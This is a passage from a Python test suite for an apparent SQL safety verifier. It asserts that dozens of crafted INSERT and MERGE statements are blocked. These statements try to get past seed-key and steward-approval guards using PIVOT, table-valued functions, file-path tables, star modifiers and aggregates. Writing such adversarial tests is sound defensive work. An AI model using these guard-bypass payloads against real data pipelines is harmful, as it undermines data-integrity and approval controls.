            with pytest.raises(OpenDVError) as exc_u:
                gate.verify_sql_ast(tid, bad_ir_sql, ir=ir_unstruct)
            assert exc_u.value.error_code == ErrorCode.EMITTER_VERIFICATION_FAILED
            assert exc_u.value.exit_code == 50
        for ok_sql in allowed_iter17:
            assert verifier.verify_sql(ok_sql, tid, extra_unstructured_links=["lnk_u"]) == [], (
                tid,
                ok_sql,
            )
            ok_ir_sql = ok_sql.replace("lnk_u", "lnk_doc_claim")
            assert gate.verify_sql_ast(tid, ok_ir_sql, ir=ir_unstruct) == [], (tid, ok_ir_sql)


def test_iter18_dv007_seed_subquery_col_alias_qualifier_and_values() -> None:
    """Block TableAlias.columns, unaliased-subquery qualifiers, VALUES, and unreferenced non-seed cols in _seed_guard across 8/8 dialects."""
    verifier = SqlAstVerifier()
    gate = TargetEvalGate()
    ir = _build_enterprise_11type_ir()
    ir_unstruct = ir.model_copy(
        update={
            "links": [
                *ir.links,
                ir.links[0].model_copy(
                    update={"link_name": "lnk_doc_claim", "link_kind": "UNSTRUCTURED_EXTRACTION_LINK"}
                ),
            ]
        }
    )

    blocked_iter18 = (
        # Challenger-1 Probes 1-4: positional TableAlias.columns on INSERT FROM & MERGE USING
        "INSERT INTO raw_vault.lnk_u (hk_u, rec_src) SELECT sub.hk_u, sub.rec_src FROM (SELECT 'EVIL_ROGUE_KEY' AS dummy, REPEAT('00', 32) AS hk_u, 'SYSTEM_SEED' AS rec_src) AS sub(hk_u, rec_src, dummy)",
        "INSERT INTO raw_vault.lnk_u (hk_u, rec_src) SELECT sub.hk_u, sub.rec_src FROM (SELECT 'EVIL_ROGUE_KEY' AS dummy, REPEAT('00', 32) AS hk_u, 'SYSTEM_SEED' AS rec_src) AS sub(hk_u, rec_src, dummy) WHERE NOT EXISTS (SELECT 1 FROM raw_vault.lnk_u AS t WHERE t.hk_u = sub.hk_u)",
        "MERGE INTO raw_vault.lnk_u AS tgt USING (SELECT 'EVIL_KEY' AS k, 'ROGUE_SRC' AS s, REPEAT('00', 32) AS hk_u, 'SYSTEM_SEED' AS rec_src) AS sub(hk_u, rec_src, k, s) ON tgt.hk_u = sub.hk_u WHEN NOT MATCHED THEN INSERT (hk_u, rec_src) VALUES (sub.hk_u, sub.rec_src)",
        "INSERT INTO raw_vault.lnk_u (hk_u, rec_src, load_dts) SELECT sub.hk_u, sub.rec_src, sub.load_dts FROM (SELECT '1900-01-01' AS load_dts, REPEAT('00', 32) AS hk_u, 'SYSTEM_SEED' AS rec_src) AS sub(hk_u, rec_src, load_dts)",
        # Unaliased subquery with qualified column (INSERT & MERGE)
        "INSERT INTO raw_vault.lnk_u (hk_u, rec_src) SELECT other.hk_u, other.rec_src FROM (SELECT REPEAT('00', 32) AS hk_u, 'SYSTEM_SEED' AS rec_src)",
        "MERGE INTO raw_vault.lnk_u AS tgt USING (SELECT REPEAT('00', 32) AS hk_u, 'SYSTEM_SEED' AS rec_src) ON 1 = 1 WHEN NOT MATCHED THEN INSERT (hk_u, rec_src) VALUES (tgt.hk_u, tgt.rec_src)",
        # VALUES inside from_.this / using and unreferenced non-seed columns in vsel
        "INSERT INTO raw_vault.lnk_u (hk_u, rec_src) SELECT sub.hk_u, sub.rec_src FROM (VALUES ('EVIL_KEY', 'ROGUE_SRC')) AS sub(hk_u, rec_src)",
        "MERGE INTO raw_vault.lnk_u AS tgt USING (VALUES ('EVIL_KEY', 'ROGUE_SRC')) AS sub(hk_u, rec_src) ON tgt.hk_u = sub.hk_u WHEN NOT MATCHED THEN INSERT (hk_u, rec_src) VALUES (sub.hk_u, sub.rec_src)",
        "INSERT INTO raw_vault.lnk_u (hk_u, rec_src) SELECT sub.hk_u, sub.rec_src FROM (SELECT 'EVIL_KEY' AS dummy, REPEAT('00', 32) AS hk_u, 'SYSTEM_SEED' AS rec_src) AS sub",
        "MERGE INTO raw_vault.lnk_u AS tgt USING (SELECT 'EVIL_KEY' AS dummy, REPEAT('00', 32) AS hk_u, 'SYSTEM_SEED' AS rec_src) AS sub ON tgt.hk_u = sub.hk_u WHEN NOT MATCHED THEN INSERT (hk_u, rec_src) VALUES (sub.hk_u, sub.rec_src)",
        # Star-projection spoofing with LEFT ANTI JOIN & TableAlias.columns inside WHERE NOT EXISTS
        "INSERT INTO raw_vault.lnk_u (hk_u, rec_src) SELECT ex.* FROM (SELECT REPEAT('00', 32) AS hk_u, 'SYSTEM_SEED' AS rec_src) AS src_q LEFT ANTI JOIN raw_vault.lnk_u AS ex ON ex.hk_u = src_q.hk_u",
        "INSERT INTO raw_vault.lnk_u (hk_u, rec_src) SELECT sub.hk_u, sub.rec_src FROM (SELECT REPEAT('00', 32) AS hk_u, 'SYSTEM_SEED' AS rec_src) AS sub WHERE NOT EXISTS (SELECT 1 FROM raw_vault.lnk_u AS t(hk_u, rec_src) WHERE t.hk_u = sub.hk_u)",
    )
    allowed_iter18 = (
        "INSERT INTO raw_vault.lnk_u (hk_u, rec_src) SELECT sub.hk_u, sub.rec_src FROM (SELECT REPEAT('00', 32) AS hk_u, 'SYSTEM_SEED' AS rec_src) AS sub WHERE NOT EXISTS (SELECT 1 FROM raw_vault.lnk_u AS t WHERE t.hk_u = sub.hk_u)",
        "INSERT INTO raw_vault.lnk_u (hk_u, rec_src) SELECT sub.hk_u, sub.rec_src FROM (SELECT REPEAT('00', 32) AS hk_u, 'SYSTEM_SEED' AS rec_src) AS sub",
        "MERGE INTO raw_vault.lnk_u AS tgt USING (SELECT REPEAT('00', 32) AS hk_u, 'SYSTEM_SEED' AS rec_src) AS sub ON tgt.hk_u = sub.hk_u WHEN NOT MATCHED THEN INSERT (hk_u, rec_src) VALUES (sub.hk_u, sub.rec_src)",
    )

    for tid in SQL_TARGET_IDS:
        for bad_sql in blocked_iter18:
            if tid != "clickhouse" and "LEFT ANTI JOIN" in bad_sql:
                continue
            diags = verifier.verify_sql(bad_sql, tid, extra_unstructured_links=["lnk_u"])
            assert any(d.rule_id == "DV-AST-007" and d.severity == "BLOCKER" for d in diags), (
                tid,
                bad_sql,
                diags,
            )
            bad_ir_sql = bad_sql.replace("lnk_u", "lnk_doc_claim")
            with pytest.raises(OpenDVError) as exc_u:
                gate.verify_sql_ast(tid, bad_ir_sql, ir=ir_unstruct)
            assert exc_u.value.error_code == ErrorCode.EMITTER_VERIFICATION_FAILED
            assert exc_u.value.exit_code == 50
        for ok_sql in allowed_iter18:
            assert verifier.verify_sql(ok_sql, tid, extra_unstructured_links=["lnk_u"]) == [], (
                tid,
                ok_sql,
            )
            ok_ir_sql = ok_sql.replace("lnk_u", "lnk_doc_claim")
            assert gate.verify_sql_ast(tid, ok_ir_sql, ir=ir_unstruct) == [], (tid, ok_ir_sql)


def test_iter19_dv007_pivot_lateral_sample_anti_side_and_star_shadow() -> None:
    """Block PIVOT/UNPIVOT, TABLESAMPLE, LATERAL VIEW, RIGHT/FULL ANTI JOIN, and star+col shadowing across 8/8 dialects."""
    import sqlglot

    from opendv.storage._steward_guard import has_steward_approved_guard

    verifier = SqlAstVerifier()
    gate = TargetEvalGate()
    ir = _build_enterprise_11type_ir()
    ir_unstruct = ir.model_copy(
        update={
            "links": [
                *ir.links,
                ir.links[0].model_copy(
                    update={"link_name": "lnk_doc_claim", "link_kind": "UNSTRUCTURED_EXTRACTION_LINK"}
                ),
            ]
        }
    )
    z64 = "0" * 64

    blocked_all_8 = (
        # Challenger-1 Repro 1 & 2: PIVOT on _seed_guard INSERT from_.this and MERGE using
        f"INSERT INTO raw_vault.lnk_u (hk_u, rec_src) SELECT \"{z64}\", rec_src FROM (SELECT '{z64}' AS \"{z64}\", 'SYSTEM_SEED' AS rec_src) AS sub PIVOT (MAX('EVIL_ROGUE_KEY') FOR \"{z64}\" IN ('{z64}'))",
        f"MERGE INTO raw_vault.lnk_u AS tgt USING (SELECT '{z64}' AS \"{z64}\", 'SYSTEM_SEED' AS rec_src) AS sub PIVOT (MAX('EVIL_ROGUE_KEY') FOR \"{z64}\" IN ('{z64}')) ON tgt.hk_u = \"{z64}\" WHEN NOT MATCHED THEN INSERT (hk_u, rec_src) VALUES (\"{z64}\", rec_src)",
        # Reviewer-1 Minor: RIGHT / FULL ANTI JOIN on _seed_guard
        "INSERT INTO raw_vault.lnk_u (hk_u, rec_src) SELECT sub.hk_u, sub.rec_src FROM (SELECT REPEAT('00', 32) AS hk_u, 'SYSTEM_SEED' AS rec_src) AS sub RIGHT ANTI JOIN raw_vault.lnk_u AS ex ON ex.hk_u = sub.hk_u",
        "INSERT INTO raw_vault.lnk_u (hk_u, rec_src) SELECT sub.hk_u, sub.rec_src FROM (SELECT REPEAT('00', 32) AS hk_u, 'SYSTEM_SEED' AS rec_src) AS sub FULL ANTI JOIN raw_vault.lnk_u AS ex ON ex.hk_u = sub.hk_u",
        # Challenger-1 Repro 3-6 + UNPIVOT: PIVOT/UNPIVOT on Table / Subquery / MERGE / JOIN
        "INSERT INTO raw_vault.lnk_u (hk_u) SELECT hk FROM staging.s2 PIVOT (MAX('APPROVED') FOR steward_gate_status IN ('PENDING' AS steward_gate_status)) WHERE steward_gate_status = 'APPROVED'",
        "INSERT INTO raw_vault.lnk_u (hk_u) SELECT hk FROM staging.s2 PIVOT (MAX('APPROVED') FOR steward_gate_status IN ('PENDING' AS steward_gate_status)) AS s2 WHERE s2.steward_gate_status = 'APPROVED'",
        "INSERT INTO raw_vault.lnk_u (hk_u) SELECT hk FROM (SELECT hk, steward_gate_status FROM staging.s2) PIVOT (MAX('APPROVED') FOR steward_gate_status IN ('PENDING' AS steward_gate_status)) WHERE steward_gate_status = 'APPROVED'",
        "MERGE INTO raw_vault.lnk_u AS tgt USING staging.s2 PIVOT (MAX('APPROVED') FOR steward_gate_status IN ('PENDING' AS steward_gate_status)) AS s2 ON tgt.hk_u = s2.hk WHEN NOT MATCHED AND s2.steward_gate_status = 'APPROVED' THEN INSERT (hk_u) VALUES (s2.hk)",
        "INSERT INTO raw_vault.lnk_u (hk_u) SELECT hk FROM staging.s3 UNPIVOT (steward_gate_status FOR col_name IN (other_col)) WHERE steward_gate_status = 'APPROVED'",
        "INSERT INTO raw_vault.lnk_u (hk_u) SELECT s.hk FROM staging.s AS s JOIN staging.s2 AS s2 PIVOT (MAX('APPROVED') FOR steward_gate_status IN ('PENDING' AS steward_gate_status)) ON s.hk = s2.hk WHERE s2.steward_gate_status = 'APPROVED'",
        # Challenger-1 Repro 7: LATERAL VIEW EXPLODE (unqualified and alias-shadowed)
        "INSERT INTO raw_vault.lnk_u (hk_u) SELECT s.hk FROM staging.s AS s LATERAL VIEW EXPLODE(ARRAY('APPROVED')) lv AS steward_gate_status WHERE steward_gate_status = 'APPROVED'",
        "INSERT INTO raw_vault.lnk_u (hk_u) SELECT s.hk FROM staging.s AS s LATERAL VIEW EXPLODE(ARRAY('APPROVED')) s AS steward_gate_status WHERE s.steward_gate_status = 'APPROVED'",
        # Parenthesized join in FROM unwrapping Table.args["joins"]
        "INSERT INTO raw_vault.lnk_u (hk_u) SELECT a.hk FROM (staging.a JOIN staging.b ON a.id = b.id) WHERE a.steward_gate_status = 'APPROVED'",
        # Challenge 4: s1.*, s2.steward_gate_status inside CTE + outer filter (DV-AST-004/007)
        "WITH c AS (SELECT s1.*, s2.steward_gate_status FROM staging.s1 AS s1 INNER JOIN staging.s2 AS s2 ON s1.hk = s2.hk) INSERT INTO raw_vault.lnk_u (hk_u) SELECT hk FROM c WHERE steward_gate_status = 'APPROVED'",
    )
    blocked_dialect_variants = (
        (
            ("databricks_uc", "bigquery", "clickhouse"),
            f"INSERT INTO raw_vault.lnk_u (hk_u, rec_src) SELECT `{z64}`, rec_src FROM (SELECT '{z64}' AS `{z64}`, 'SYSTEM_SEED' AS rec_src) AS sub PIVOT (MAX('EVIL_ROGUE_KEY') FOR `{z64}` IN ('{z64}'))",
        ),
        (
            tuple(t for t in SQL_TARGET_IDS if t != "clickhouse"),
            "INSERT INTO raw_vault.lnk_u (hk_u, rec_src) SELECT sub.hk_u, sub.rec_src FROM (SELECT REPEAT('00', 32) AS hk_u, 'SYSTEM_SEED' AS rec_src) AS sub TABLESAMPLE SYSTEM (0 PERCENT)",
        ),
        (
            ("databricks_uc", "snowflake"),
            "INSERT INTO raw_vault.lnk_u (hk_u) SELECT hk FROM staging.s MATCH_RECOGNIZE (ORDER BY hk MEASURES 'APPROVED' AS steward_gate_status PATTERN (A) DEFINE A AS 1 = 1) WHERE steward_gate_status = 'APPROVED'",
        ),
    )

    for tid in SQL_TARGET_IDS:
        for bad_sql in blocked_all_8:
            diags = verifier.verify_sql(bad_sql, tid, extra_unstructured_links=["lnk_u"])
            assert any(d.rule_id == "DV-AST-007" and d.severity == "BLOCKER" for d in diags), (
                tid,
                bad_sql,
                diags,
            )
            bad_ir_sql = bad_sql.replace("lnk_u", "lnk_doc_claim")
            with pytest.raises(OpenDVError) as exc_u:
                gate.verify_sql_ast(tid, bad_ir_sql, ir=ir_unstruct)
            assert exc_u.value.error_code == ErrorCode.EMITTER_VERIFICATION_FAILED
            assert exc_u.value.exit_code == 50

        for target_subset, var_sql in blocked_dialect_variants:
            if tid in target_subset:
                diags = verifier.verify_sql(var_sql, tid, extra_unstructured_links=["lnk_u"])
                assert any(d.rule_id == "DV-AST-007" and d.severity == "BLOCKER" for d in diags), (
                    tid,
                    var_sql,
                    diags,
                )
            with pytest.raises(OpenDVError) as exc_v:
                gate.verify_sql_ast(tid, var_sql.replace("lnk_u", "lnk_doc_claim"), ir=ir_unstruct)
            assert exc_v.value.error_code == ErrorCode.EMITTER_VERIFICATION_FAILED
            assert exc_v.value.exit_code == 50

    # Standalone guard checks for Challenge 4 (s1.*, s2.steward_gate_status) & * REPLACE
    for standalone_sql in (
        "WITH c AS (SELECT s1.*, s2.steward_gate_status FROM staging.s1 AS s1 INNER JOIN staging.s2 AS s2 ON s1.hk = s2.hk) INSERT INTO raw_vault.lnk_u (hk_u) SELECT hk FROM c WHERE steward_gate_status = 'APPROVED'",
        "WITH c AS (SELECT * REPLACE ('APPROVED' AS steward_gate_status) FROM staging.s) INSERT INTO raw_vault.lnk_u (hk_u) SELECT hk FROM c WHERE steward_gate_status = 'APPROVED'",
    ):
        assert has_steward_approved_guard(sqlglot.parse_one(standalone_sql, read="duckdb")) is False

    # Valid controls: zero false positives across 8/8 dialects
    for tid in SQL_TARGET_IDS:
        ok_sql = "INSERT INTO raw_vault.lnk_u (hk_u) SELECT s1.hk FROM staging.s1 AS s1 INNER JOIN staging.s2 AS s2 ON s1.hk = s2.hk WHERE s2.steward_gate_status = 'APPROVED'"
        assert verifier.verify_sql(ok_sql, tid, extra_unstructured_links=["lnk_u"]) == []
        assert gate.verify_sql_ast(tid, ok_sql.replace("lnk_u", "lnk_doc_claim"), ir=ir_unstruct) == []


def test_iter20_dv007_tvf_and_star_modifiers() -> None:
    """Block TVFs (query/JSON_TABLE/OPENJSON/XMLTABLE/FLATTEN/read_json/MY_TVF) and Star modifiers across 8/8 dialects."""
    from opendv.storage._seed_guard import is_zero_key_system_seed
    from opendv.storage._steward_guard import has_steward_approved_guard

    verifier = SqlAstVerifier()
    gate = TargetEvalGate()
    ir = _build_enterprise_11type_ir()
    ir_unstruct = ir.model_copy(
        update={
            "links": [
                *ir.links,
                ir.links[0].model_copy(
                    update={"link_name": "lnk_doc_claim", "link_kind": "UNSTRUCTURED_EXTRACTION_LINK"}
                ),
            ]
        }
    )

    tvf_all_8 = (
        "INSERT INTO raw_vault.lnk_u (hk_u) SELECT jt.hk FROM JSON_TABLE('[{\"hk\":\"evil\",\"steward_gate_status\":\"APPROVED\"}]', '$[*]' COLUMNS (hk VARCHAR PATH '$.hk', steward_gate_status VARCHAR PATH '$.steward_gate_status')) AS jt WHERE jt.steward_gate_status = 'APPROVED'",
        "MERGE INTO raw_vault.lnk_u AS tgt USING JSON_TABLE('[{\"hk\":\"evil\",\"steward_gate_status\":\"APPROVED\"}]', '$[*]' COLUMNS (hk VARCHAR PATH '$.hk', steward_gate_status VARCHAR PATH '$.steward_gate_status')) AS jt ON tgt.hk_u = jt.hk WHEN NOT MATCHED AND jt.steward_gate_status = 'APPROVED' THEN INSERT (hk_u) VALUES (jt.hk)",
        "INSERT INTO raw_vault.lnk_u (hk_u) SELECT oj.hk FROM OPENJSON('[{\"hk\":\"evil\",\"steward_gate_status\":\"APPROVED\"}]') WITH (hk VARCHAR(50), steward_gate_status VARCHAR(50)) AS oj WHERE oj.steward_gate_status = 'APPROVED'",
        "INSERT INTO raw_vault.lnk_u (hk_u) SELECT xt.hk FROM XMLTABLE('/r/row' PASSING '<r><row><hk>evil</hk><steward_gate_status>APPROVED</steward_gate_status></row></r>' COLUMNS hk VARCHAR PATH 'hk', steward_gate_status VARCHAR PATH 'steward_gate_status') AS xt WHERE xt.steward_gate_status = 'APPROVED'",
        "INSERT INTO raw_vault.lnk_u (hk_u) SELECT t.hk FROM MY_TVF('EVIL', 'APPROVED') AS t WHERE t.steward_gate_status = 'APPROVED'",
        "INSERT INTO raw_vault.lnk_u (hk_u) SELECT r.hk FROM read_json('evil.json') AS r WHERE r.steward_gate_status = 'APPROVED'",
        "INSERT INTO raw_vault.lnk_u (hk_u) SELECT f.hk FROM TABLE(FLATTEN(INPUT => PARSE_JSON('[1]'))) AS f WHERE f.steward_gate_status = 'APPROVED'",
    )
    tvf_non_bq = (
        "INSERT INTO raw_vault.lnk_u (hk_u) SELECT q.hk FROM query('SELECT ''EVIL_QUERY_FN'' AS hk, ''APPROVED'' AS steward_gate_status') AS q WHERE q.steward_gate_status = 'APPROVED'",
        "MERGE INTO raw_vault.lnk_u AS tgt USING query('SELECT ''EVIL_MERGE_Q'' AS hk, ''APPROVED'' AS steward_gate_status') AS q ON tgt.hk_u = q.hk WHEN NOT MATCHED AND q.steward_gate_status = 'APPROVED' THEN INSERT (hk_u) VALUES (q.hk)",
        "INSERT INTO raw_vault.lnk_u (hk_u) SELECT s.hk FROM staging.s AS s JOIN query('SELECT ''EVIL_JOIN_Q'' AS hk, ''APPROVED'' AS steward_gate_status') AS q ON s.hk = q.hk WHERE q.steward_gate_status = 'APPROVED'",
        "WITH c AS (SELECT q.hk, q.steward_gate_status FROM query('SELECT ''evil'' AS hk, ''APPROVED'' AS steward_gate_status') AS q) INSERT INTO raw_vault.lnk_u (hk_u) SELECT hk FROM c WHERE steward_gate_status = 'APPROVED'",
    )

    for tid in SQL_TARGET_IDS:
        for bad_sql in tvf_all_8:
            diags = verifier.verify_sql(bad_sql, tid, extra_unstructured_links=["lnk_u"])
            assert any(d.rule_id == "DV-AST-007" and d.severity == "BLOCKER" for d in diags), (
                tid,
                bad_sql,
                diags,
            )
            with pytest.raises(OpenDVError) as exc_u:
                gate.verify_sql_ast(tid, bad_sql.replace("lnk_u", "lnk_doc_claim"), ir=ir_unstruct)
            assert exc_u.value.error_code == ErrorCode.EMITTER_VERIFICATION_FAILED
            assert exc_u.value.exit_code == 50

        for q_sql in tvf_non_bq:
            diags = verifier.verify_sql(q_sql, tid, extra_unstructured_links=["lnk_u"])
            expected_rule = "EVAL-AST-01" if tid == "bigquery" else "DV-AST-007"
            assert any(d.rule_id == expected_rule and d.severity == "BLOCKER" for d in diags), (
                tid,
                q_sql,
                diags,
            )
            with pytest.raises(OpenDVError) as exc_q:
                gate.verify_sql_ast(tid, q_sql.replace("lnk_u", "lnk_doc_claim"), ir=ir_unstruct)
            assert exc_q.value.error_code == ErrorCode.EMITTER_VERIFICATION_FAILED
            assert exc_q.value.exit_code == 50

    z64 = "0" * 64
    seed_star_mods = (
        f"INSERT INTO raw_vault.lnk_u (hk_u, rec_src) SELECT * REPLACE ('EVIL_ROGUE_KEY' AS hk_u) FROM (SELECT '{z64}' AS hk_u, 'SYSTEM_SEED' AS rec_src) AS sub",
        f"INSERT INTO raw_vault.lnk_u (hk_u, rec_src) SELECT sub.* REPLACE ('EVIL_ROGUE_KEY' AS hk_u) FROM (SELECT '{z64}' AS hk_u, 'SYSTEM_SEED' AS rec_src) AS sub",
        f"INSERT INTO raw_vault.lnk_u (hk_u, rec_src) SELECT * RENAME (rec_src AS hk_u, hk_u AS rec_src) FROM (SELECT '{z64}' AS hk_u, 'SYSTEM_SEED' AS rec_src) AS sub",
        f"INSERT INTO raw_vault.lnk_u (hk_u, rec_src) SELECT * EXCEPT (hk_u) FROM (SELECT '{z64}' AS hk_u, 'SYSTEM_SEED' AS rec_src) AS sub",
        f"INSERT INTO raw_vault.lnk_u (hk_u, rec_src) SELECT * ILIKE '%' FROM (SELECT '{z64}' AS hk_u, 'SYSTEM_SEED' AS rec_src) AS sub",
    )
    ok_seed_star = f"INSERT INTO raw_vault.lnk_u (hk_u, rec_src) SELECT * FROM (SELECT '{z64}' AS hk_u, 'SYSTEM_SEED' AS rec_src) AS sub"
    ilike_steward_sql = "WITH c AS (SELECT s.* ILIKE '%' FROM staging.s AS s) INSERT INTO raw_vault.lnk_u (hk_u) SELECT hk FROM c WHERE steward_gate_status = 'APPROVED'"

    for tid in SQL_TARGET_IDS:
        dialect = get_dialect_profile(tid).sqlglot_dialect or "duckdb"
        for mod_sql in seed_star_mods:
            assert is_zero_key_system_seed(sqlglot.parse_one(mod_sql, read=dialect), {"lnk_u"}) is False, (
                tid,
                mod_sql,
            )
        assert is_zero_key_system_seed(sqlglot.parse_one(ok_seed_star, read=dialect), {"lnk_u"}) is True, tid
        assert has_steward_approved_guard(sqlglot.parse_one(ilike_steward_sql, read=dialect)) is False, tid


def test_iter21_dv007_dv006_scalar_agg_grouping_and_file_table_refs() -> None:
    """Block scalar aggregates, empty/grand-total GROUP BY, and string-literal/file-path/format tables across 8/8 dialects."""
    from opendv.storage._steward_guard import has_steward_approved_guard

    verifier = SqlAstVerifier()
    gate = TargetEvalGate()
    ir = _build_enterprise_11type_ir()
    ir_unstruct = ir.model_copy(
        update={
            "links": [
                *ir.links,
                ir.links[0].model_copy(
                    update={"link_name": "lnk_doc_claim", "link_kind": "UNSTRUCTURED_EXTRACTION_LINK"}
                ),
            ]
        }
    )

    blocked_ch1 = (
        "INSERT INTO raw_vault.lnk_u (hk_u) SELECT COALESCE(MAX(s.hk), 'EVIL_SCALAR_AGG') FROM staging.s AS s WHERE s.steward_gate_status = 'APPROVED'",
        "INSERT INTO raw_vault.lnk_u (hk_u) SELECT CASE WHEN COUNT(*) = 0 THEN 'EVIL_COUNT0' ELSE MAX(s.hk) END FROM staging.s AS s WHERE s.steward_gate_status = 'APPROVED'",
        "INSERT INTO raw_vault.lnk_u (hk_u) SELECT CASE WHEN SUM(1) IS NULL THEN 'EVIL_SUM' ELSE 'OK' END FROM staging.s AS s WHERE s.steward_gate_status = 'APPROVED'",
        "INSERT INTO raw_vault.lnk_u (hk_u) SELECT COALESCE(ANY_VALUE(s.hk), 'EVIL_ANYVAL') FROM staging.s AS s WHERE s.steward_gate_status = 'APPROVED'",
        "INSERT INTO raw_vault.lnk_u (hk_u) SELECT COALESCE(STRING_AGG(s.hk, ','), 'EVIL_STRAGG') FROM staging.s AS s WHERE s.steward_gate_status = 'APPROVED'",
        "INSERT INTO raw_vault.lnk_u (hk_u) SELECT COALESCE(FIRST(s.hk), 'EVIL_FIRST') FROM staging.s AS s WHERE s.steward_gate_status = 'APPROVED'",
        "INSERT INTO raw_vault.lnk_u (hk_u) SELECT JSON_AGG(s.hk) FROM staging.s AS s WHERE s.steward_gate_status = 'APPROVED'",
        "INSERT INTO raw_vault.lnk_u (hk_u) SELECT JSONB_AGG(s.hk) FROM staging.s AS s WHERE s.steward_gate_status = 'APPROVED'",
        "INSERT INTO raw_vault.lnk_u (hk_u) SELECT ARRAY_AGG(s.hk) FROM staging.s AS s WHERE s.steward_gate_status = 'APPROVED'",
        "INSERT INTO raw_vault.lnk_u (hk_u) SELECT COALESCE(MAX(s.hk), 'EVIL_HAVING') FROM staging.s AS s WHERE s.steward_gate_status = 'APPROVED' HAVING COUNT(*) >= 0",
        "INSERT INTO raw_vault.lnk_u (hk_u) SELECT s.hk FROM staging.s AS s WHERE s.steward_gate_status = 'APPROVED' HAVING 1 = 1",
        "MERGE INTO raw_vault.lnk_u AS tgt USING (SELECT COALESCE(MAX(s.hk), 'EVIL_MERGE_AGG') AS hk FROM staging.s AS s WHERE s.steward_gate_status = 'APPROVED') AS u ON tgt.hk_u = u.hk WHEN NOT MATCHED THEN INSERT (hk_u) VALUES (u.hk)",
        "WITH c AS (SELECT COALESCE(MAX(s.hk), 'EVIL_CTE_AGG') AS hk FROM staging.s AS s WHERE s.steward_gate_status = 'APPROVED') INSERT INTO raw_vault.lnk_u (hk_u) SELECT hk FROM c",
        "WITH c AS (SELECT s.hk FROM staging.s AS s WHERE s.steward_gate_status = 'APPROVED') INSERT INTO raw_vault.lnk_u (hk_u) SELECT COALESCE(MAX(hk), 'EVIL_OUTER_AGG') FROM c",
        "INSERT INTO raw_vault.lnk_u (hk_u) SELECT COALESCE(MAX(s.hk), 'EVIL_EMPTY_GRP') FROM staging.s AS s WHERE s.steward_gate_status = 'APPROVED' GROUP BY ()",
        "INSERT INTO raw_vault.lnk_u (hk_u) SELECT COALESCE(MAX(s.hk), 'EVIL_NESTED_EMPTY') FROM staging.s AS s WHERE s.steward_gate_status = 'APPROVED' GROUP BY (())",
        "INSERT INTO raw_vault.lnk_u (hk_u) SELECT COALESCE(MAX(s.hk), 'EVIL_GRP_ALL') FROM staging.s AS s WHERE s.steward_gate_status = 'APPROVED' GROUP BY ALL",
        "INSERT INTO raw_vault.lnk_u (hk_u) SELECT COALESCE(s.hk, 'EVIL_GS_MIXED') FROM staging.s AS s WHERE s.steward_gate_status = 'APPROVED' GROUP BY GROUPING SETS ((), (s.hk))",
        "INSERT INTO raw_vault.lnk_u (hk_u) SELECT COALESCE(s.hk, 'EVIL_ROLLUP') FROM staging.s AS s WHERE s.steward_gate_status = 'APPROVED' GROUP BY ROLLUP (s.hk)",
        "INSERT INTO raw_vault.lnk_u (hk_u) SELECT COALESCE(s.hk, 'EVIL_CUBE') FROM staging.s AS s WHERE s.steward_gate_status = 'APPROVED' GROUP BY CUBE (s.hk)",
        "INSERT INTO raw_vault.lnk_u (hk_u) SELECT COALESCE(s.hk, 'EVIL_WITH_ROLLUP') FROM staging.s AS s WHERE s.steward_gate_status = 'APPROVED' GROUP BY s.hk WITH ROLLUP",
        "INSERT INTO raw_vault.lnk_u (hk_u) SELECT COALESCE(s.hk, 'EVIL_WITH_CUBE') FROM staging.s AS s WHERE s.steward_gate_status = 'APPROVED' GROUP BY s.hk WITH CUBE",
    )
    allowed_ch1 = (
        "INSERT INTO raw_vault.lnk_u (hk_u) SELECT s.hk FROM staging.s AS s WHERE s.steward_gate_status = 'APPROVED' GROUP BY s.hk",
        "INSERT INTO raw_vault.lnk_u (hk_u) SELECT s.hk FROM staging.s AS s WHERE s.steward_gate_status = 'APPROVED' GROUP BY s.hk HAVING COUNT(*) >= 1",
        "INSERT INTO raw_vault.lnk_u (hk_u) SELECT s.hk FROM staging.s AS s WHERE s.steward_gate_status = 'APPROVED' AND s.hk IN (SELECT MAX(x.hk) FROM staging.x AS x)",
        "INSERT INTO raw_vault.lnk_u (hk_u, rec_src) SELECT s.hk, 'SRC' FROM staging.s AS s WHERE s.steward_gate_status = 'APPROVED'",
    )
    sat_scalar_aggs = (
        "INSERT INTO raw_vault.sat_issuer_core (hk_issuer, load_dts, rec_src, hash_diff) SELECT MAX(hk_issuer), MAX(load_dts), 'SRC', MAX(hash_diff) FROM staging.s",
        "INSERT INTO raw_vault.mas_issuer_ballot (hk_issuer, load_dts, rec_src, hash_diff) SELECT MAX(hk_issuer), MAX(load_dts), 'SRC', MAX(hash_diff) FROM staging.s",
        "INSERT INTO raw_vault.esat_issuer_crosswalk (hk_sal_issuer, load_dts, rec_src) SELECT MAX(hk_sal_issuer), MAX(load_dts), 'SRC' FROM staging.s",
        "INSERT INTO raw_vault.sts_issuer (hk_issuer, load_dts, rec_src) SELECT MAX(hk_issuer), MAX(load_dts), 'SRC' FROM staging.s",
        "INSERT INTO raw_vault.rts_issuer (hk_issuer, load_dts, rec_src) SELECT MAX(hk_issuer), MAX(load_dts), 'SRC' FROM staging.s",
    )

    blocked_ch2_all = (
        "INSERT INTO raw_vault.lnk_u (hk_u) SELECT p.hk FROM 'evil.parquet' AS p WHERE p.steward_gate_status = 'APPROVED'",
        "MERGE INTO raw_vault.lnk_u AS tgt USING 'evil.parquet' AS p ON tgt.hk_u = p.hk WHEN NOT MATCHED AND p.steward_gate_status = 'APPROVED' THEN INSERT (hk_u) VALUES (p.hk)",
        "INSERT INTO raw_vault.lnk_u (hk_u) SELECT p.hk FROM parquet.`evil.parquet` AS p WHERE p.steward_gate_status = 'APPROVED'",
        "INSERT INTO raw_vault.lnk_u (hk_u) SELECT p.hk FROM delta.`evil_tbl` AS p WHERE p.steward_gate_status = 'APPROVED'",
        "INSERT INTO raw_vault.lnk_u (hk_u) SELECT p.hk FROM csv.`evil.csv` AS p WHERE p.steward_gate_status = 'APPROVED'",
        "INSERT INTO raw_vault.lnk_u (hk_u) SELECT p.hk FROM parquet.\"evil.parquet\" AS p WHERE p.steward_gate_status = 'APPROVED'",
        "INSERT INTO raw_vault.lnk_u (hk_u) SELECT p.hk FROM delta.evil_tbl AS p WHERE p.steward_gate_status = 'APPROVED'",
        "INSERT INTO raw_vault.lnk_u (hk_u) SELECT p.hk FROM csv.evil_tbl AS p WHERE p.steward_gate_status = 'APPROVED'",
        "INSERT INTO raw_vault.lnk_u (hk_u) SELECT p.hk FROM \"dir/evil.parquet\" AS p WHERE p.steward_gate_status = 'APPROVED'",
        "INSERT INTO raw_vault.lnk_u (hk_u) SELECT p.hk FROM \"dir/evil\" AS p WHERE p.steward_gate_status = 'APPROVED'",
